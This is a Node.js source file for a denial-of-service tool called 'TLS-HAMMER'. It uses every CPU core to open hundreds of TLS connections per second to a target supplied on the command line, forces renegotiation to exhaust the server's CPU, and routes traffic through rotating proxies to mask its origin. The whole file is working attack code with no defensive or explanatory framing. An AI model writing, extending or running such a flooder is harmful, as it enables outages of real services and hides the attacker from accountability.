// R10-3: TLS-HAMMER - SSL/TLS Handshake Exhaustion
// Focus: CPU burn on target (low local CPU)
// Technique: Rapid TLS renegotiation + Session resumption

const tls = require('tls');
const net = require('net');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];

// Load proxies
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-3] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-3] No proxy.txt found, running without proxies');
}

if (cluster.isMaster) {
    console.log(`[R10-3] TLS-HAMMER launching on ${CPU_CORES} cores`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = process.argv[2];
    const time = process.argv[3] || 300;
    startTLSHammer(target, time);
}

function startTLSHammer(target, time) {
    const parsed = new URL(target);
    let handshakes = 0;
    
    const interval = setInterval(() => {
        for (let i = 0; i < 100; i++) {
            try {
                if (proxies.length > 0) {
                    // Use proxy
                    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                    const [proxyHost, proxyPort] = proxy.split(':');
                    
                    const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                        socket.write(`CONNECT ${parsed.hostname}:443 HTTP/1.1\r\nHost: ${parsed.hostname}:443\r\n\r\n`);
                        
                        socket.once('data', () => {
                            const tlsSocket = tls.connect({
                                socket: socket,
                                servername: parsed.hostname,
                                rejectUnauthorized: false,
                                ciphers: 'AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
                                secureProtocol: 'TLSv1_2_method'
                            });
                            
                            tlsSocket.on('secureConnect', () => {
                                handshakes++;
                                
                                // Immediate renegotiation - CPU heavy on target
                                if (Math.random() > 0.5) {
                                    tlsSocket.renegotiate({}, (err) => {});
                                }
                                
                                setTimeout(() => tlsSocket.destroy(), 100);
                            });
                            
                            tlsSocket.on('error', () => {});
                        });
                    });
                    
                    socket.on('error', () => {});
                } else {
                    // Direct connection
                    const tlsSocket = tls.connect(443, parsed.hostname, {
                        rejectUnauthorized: false,
                        servername: parsed.hostname,
                        ciphers: 'AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
                        secureProtocol: 'TLSv1_2_method'
                    }, () => {
                        handshakes++;
                        
                        if (Math.random() > 0.5) {
                            tlsSocket.renegotiate({}, (err) => {});
                        }
                        
                        setTimeout(() => tlsSocket.destroy(), 100);
                    });
                    
                    tlsSocket.on('error', () => {});
                }
            } catch (e) {}
        }
    }, 50);
    
    setInterval(() => {
        console.log(`[R10-3] Handshakes/sec: ${handshakes}`);
        handshakes = 0;
    }, 1000);
    
    setTimeout(() => {
        clearInterval(interval);
        process.exit(0);
    }, time * 1000);
}